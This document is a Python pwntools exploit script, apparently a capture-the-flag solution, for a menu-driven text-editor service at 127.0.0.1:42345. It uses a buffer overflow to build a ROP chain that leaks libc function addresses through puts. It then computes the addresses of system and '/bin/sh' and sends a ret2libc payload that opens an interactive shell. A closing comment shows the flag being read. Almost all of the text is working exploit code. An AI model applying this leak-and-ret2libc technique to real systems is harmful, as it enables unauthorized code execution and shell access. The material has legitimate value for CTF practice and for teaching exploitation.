from pwn import *


s = remote('127.0.0.1', 42345)

def add_text(text):
    s.recvuntil('Enter ur option :')
    s.sendline('1')
    s.sendline(text)

def edit_text(opt, text):
    s.recvuntil('Enter ur option :')
    s.sendline('2')
    s.recvline()
    s.recvline()
    s.sendline(str(opt))
    s.sendline(text)

def display_text():
    s.recvuntil('Enter ur option :')
    s.sendline('3')

def _exit():
    s.recvuntil('Enter ur option :')
    s.sendline('4')

print "[*] Triggering memory leaks..."

jmp_puts = 0x08048420
got = 0x0804A00C
pc = p32(jmp_puts)
ret = p32(0x0804862F)
arg0 = p32(got)

overflow = pc + ret + arg0

add_text('A'*0x30)
edit_text(1, 'B'*(0x18+2)+overflow)
_exit()

r = s.recv(1024)
print "[*] Gotting libc virtual addresses..."

VAs = map(''.join, zip(*[iter(r)]*4))
printf = u32(VAs[0])
fgets = u32(VAs[1])
strcat = u32(VAs[2])
puts = u32(VAs[3])
strchr = u32(VAs[4])
libc_start_main = u32(VAs[5])
setvbuf = u32(VAs[6])
atoi = u32(VAs[7])

print "[*] printf @ 0x%x" % printf
print "[*] fgets @ 0x%x" % fgets
print "[*] strcat @ 0x%x" % strcat
print "[*] puts @ 0x%x" % puts
print "[*] strchr @ 0x%x" % strchr
print "[*] __libc_start_main @ 0x%x" % libc_start_main
print "[*] atoi @ 0x%x" % atoi

libc = printf - 0x49670
one_shot = libc + 0x3AC69
psystem = libc + 0x3ADA0
psh = libc + 0x15B82B
buff = 0x804A060

print "[*] libc @ %x" % libc
print "[*] system @ %x" % psystem
print "[*] '/bin/sh' @ %x" % psh

ret2libc = p32(psystem) + 'Z'*4 + p32(psh)


s.sendline('1')
s.sendline('A'*0x30)
edit_text(1, 'B'*(0x18+2) + ret2libc)

_exit()
s.interactive()

'''
$ cat /home/pwn4/flag.txt
xiomara{cl!_ed!t0r_pwn!ng_!$_th3_n3w_$3xy}
'''
